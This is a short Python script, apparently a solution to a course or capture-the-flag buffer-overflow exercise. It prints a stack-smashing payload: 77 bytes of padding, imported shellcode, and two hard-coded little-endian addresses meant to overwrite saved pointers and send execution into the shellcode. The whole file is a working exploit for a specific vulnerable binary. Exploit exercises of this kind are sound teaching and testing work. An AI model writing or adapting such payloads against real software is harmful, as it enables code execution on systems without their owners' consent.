#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(b"a"*77)
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(pack("<I", 0xfffeb314))
sys.stdout.buffer.write(pack("<I", 0xfffeb2a4))